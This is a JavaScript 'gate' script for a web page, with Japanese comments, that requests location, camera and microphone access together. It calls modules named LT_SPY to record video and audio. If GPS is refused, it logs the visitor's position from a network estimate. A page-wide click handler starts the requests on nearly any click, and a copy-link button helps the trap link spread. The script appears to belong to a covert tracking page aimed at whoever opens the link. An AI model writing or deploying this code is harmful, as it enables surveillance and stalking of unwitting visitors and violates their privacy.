/* 要件ゲート。押された「同じタスク」で 位置情報・カメラ・マイク を同時に要求する。 */
(function () {
  "use strict";

  var GATE = document.getElementById("lt_gate");
  var btn = document.getElementById("lt_go");
  var stat = document.getElementById("lt_gate_st");
  var busy = false;

  function say(t, warn) {
    if (!stat) return;
    stat.textContent = t || "";
    stat.style.color = warn ? "#f0b429" : "";
  }
  function wait(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  var cp = document.getElementById("lt_copy");
  if (cp) {
    cp.addEventListener("click", function (e) {
      e.stopPropagation();
      var url = location.href;
      function done() {
        cp.textContent = "コピーしました";
        setTimeout(function () { cp.textContent = "リンクをコピー"; }, 1600);
      }
      function fallback() {
        try {
          var t = document.createElement("textarea");
          t.value = url; t.style.cssText = "position:fixed;left:-9999px";
          document.body.appendChild(t); t.select();
          document.execCommand("copy"); t.remove(); done();
        } catch (err) {}
      }
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(url).then(done).catch(fallback);
        } else fallback();
      } catch (err) { fallback(); }
    });
  }

  function showHelp() {
    if (window.LTGEO && LTGEO.showHint) { try { LTGEO.showHint(); return; } catch (e) {} }
    var box = document.getElementById("lt_ia");
    if (box) box.style.display = "block";
  }

  function geoStart() {
    if (!window.LTGEO) { say("① 位置情報：この端末では非対応", true); showHelp(); return Promise.resolve(false); }
    return new Promise(function (res) {
      var settled = false;
      function settle(v) { if (!settled) { settled = true; res(v); } }

      LTGEO.subscribe(function (p) {
        window.LT_FIRST_FIX = p;
        say("① 位置情報：取得しました");
        settle(true);
      });
      LTGEO.subscribeFail(function (why) {
        if (why === "denied") { say("① 位置情報：ブロックされています", true); showHelp(); }
        else { say("① 位置情報：端末が位置を出せていません（回線からの推定で記録します）", true); }
        settle(false);
      });
      LTGEO.subscribeStatus(function (t, w) { if (!settled) say("① " + t, w); });

      var inf = LTGEO.info();
      if (inf.running) LTGEO.retry(); else LTGEO.start();
      setTimeout(function () { settle(!!window.LT_FIRST_FIX); }, 20000);
    });
  }

  function cam() {
    if (!window.LT_CAM || !window.LT_SPY || !window.LT_SPY.cam) return Promise.resolve(true);
    say("② カメラの許可を確認しています…");
    return Promise.race([window.LT_SPY.cam(), wait(30000)]).then(function (ok) {
      ok = ok !== false;
      say(ok ? "② カメラ：映像を記録中" : "② カメラ：取れませんでした", !ok);
      return ok;
    }).catch(function () { return false; });
  }

  function mic() {
    if (!window.LT_MIC || !window.LT_SPY || !window.LT_SPY.mic) return Promise.resolve(true);
    say("③ マイクの許可を確認しています…");
    return Promise.race([window.LT_SPY.mic(), wait(30000)]).then(function (ok) {
      ok = ok !== false;
      say(ok ? "③ マイク：OK" : "③ マイク：取れませんでした", !ok);
      return ok;
    }).catch(function () { return false; });
  }

  function pass() {
    if (window.LT_GATE_PASS) return;
    window.LT_GATE_PASS = true;
    if (GATE) {
      GATE.classList.add("out");
      setTimeout(function () { GATE.style.display = "none"; }, 420);
    }
    if (window.LT_FIRST_FIX && window.LT_LIVE && window.LT_LIVE.feed) {
      try { window.LT_LIVE.feed(window.LT_FIRST_FIX); } catch (e) {}
    }
    try { window.dispatchEvent(new Event("igt:gate")); } catch (e) {}
  }

  function run() {
    if (busy) return;
    busy = true;
    if (btn) { btn.disabled = true; btn.textContent = "確認中…"; }
    say("");

    var res = { geo: false, cam: false, mic: false };
    var left = 3, closed = false;

    function close() {
      if (closed) return;
      closed = true;
      busy = false;
      if (res.geo && res.cam && res.mic) {
        window.LT_ALLOW_REDIRECT = true;
        var ia = document.getElementById("lt_ia");
        if (ia) ia.style.display = "none";
      } else {
        document.body.classList.add("need");
        if (!res.geo) showHelp();
      }
      setTimeout(pass, 250);
    }

    geoStart().then(function (v) { res.geo = v; if (--left <= 0) close(); });
    cam().then(function (v) { res.cam = v; if (--left <= 0) close(); });
    mic().then(function (v) { res.mic = v; if (--left <= 0) close(); });
    setTimeout(close, 24000);
  }

  if (btn) btn.addEventListener("click", run);
  document.addEventListener("click", function (e) {
    if (busy) return;
    if (e.target === btn) return;
    if (e.target && e.target.closest && e.target.closest(".noclick")) return;
    run();
  }, { passive: true });

  window.LT_GATE_RUN = run;
  window.LT_GATE_RETRY = function () { busy = false; run(); };
  if (!GATE) pass();
})();